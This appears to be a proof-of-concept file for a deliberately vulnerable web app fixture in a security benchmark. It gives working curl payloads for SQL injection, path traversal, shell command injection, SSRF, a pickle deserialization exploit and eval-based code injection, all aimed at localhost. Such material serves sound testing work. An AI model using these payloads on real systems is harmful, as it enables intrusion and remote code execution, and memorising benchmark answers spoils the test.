# App Project Robs Awesome VulnBench 2.0 POCs

Run these commands only against a local instance started from
`fixtures/app-project-robs-awesome/project` (e.g. `uv run uvicorn backend.www:app`), seeded with
`IS_DEV=1 uv run backend test-data` after running migrations. All payloads below were verified
live against a running instance of this exact fixture.

## SQL injection

The reports search endpoint concatenates the `query` parameter directly into a raw SQL
`LIKE` clause. A search term that legitimately matches nothing, closed with a SQL comment,
turns the `WHERE` clause into an always-true condition and returns every report:

```sh
curl -G --data-urlencode "query=zzz' OR '1'='1' -- " \
  http://localhost:8000/api/reports
```

## Path traversal

The document download endpoint accepts a multi-segment name and passes it to
`resolve_document_path()` in the documents service layer, which joins it directly onto the
documents directory with no containment check. Escaping two levels up reads a file outside
the intended folder:

```sh
curl "http://localhost:8000/api/documents/..%2F..%2Fpyproject.toml"
```

(Percent-encode the `../` segments — an unencoded `../` in the URL gets normalized away by
most HTTP clients, including `curl`, before the request is even sent.)

## Command injection

The integration DNS-check endpoint embeds the `hostname` parameter directly in a
double-quoted shell command. A quote-breaking hostname runs an arbitrary command:

```sh
curl -G --data-urlencode 'hostname=localhost"; id; #' \
  http://localhost:8000/api/integrations/dns-check
```

## SSRF

The integration preview endpoint fetches the `url` parameter server-side with no
allowlist. Point it at any locally-reachable service to prove the server (not the client)
makes the request — for example, a second local server on another port:

```sh
python3 -m http.server 8999 --bind 127.0.0.1 &
curl -G --data-urlencode "url=http://127.0.0.1:8999/" \
  http://localhost:8000/api/integrations/preview
```

## Insecure deserialization

The report draft resume endpoint unpickles the base64-decoded `state` parameter with no
integrity check. A crafted payload whose `__reduce__` calls `os.system` executes arbitrary
commands the moment it's deserialized:

```sh
python3 -c "
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id > /tmp/robs_awesome_proof.txt',))

print(base64.b64encode(pickle.dumps(Exploit())).decode())
" > /tmp/robs_awesome_payload.txt

curl -X POST http://localhost:8000/api/reports/draft \
  -H "Content-Type: application/json" \
  -d "{\"state\": \"$(cat /tmp/robs_awesome_payload.txt)\"}"

cat /tmp/robs_awesome_proof.txt   # proves the command executed server-side
```

## Open redirect

The report-open endpoint redirects to the `return_to` parameter with no validation that
the target is a relative path or an allowlisted host:

```sh
curl -i "http://localhost:8000/api/reports/1/open?return_to=https://example.com/"
```

## Code injection

The report filter endpoint evaluates the `expression` parameter directly with `eval()`.
Passing a dict of local variables does not restrict access to builtins, so arbitrary code
(and, via `__import__`, arbitrary OS commands) can be executed:

```sh
curl -X POST http://localhost:8000/api/reports/evaluate \
  -H "Content-Type: application/json" \
  -d '{"expression": "__import__(\"os\").system(\"id > /tmp/robs_awesome_proof2.txt\") == 0"}'

cat /tmp/robs_awesome_proof2.txt   # proves the command executed server-side
```
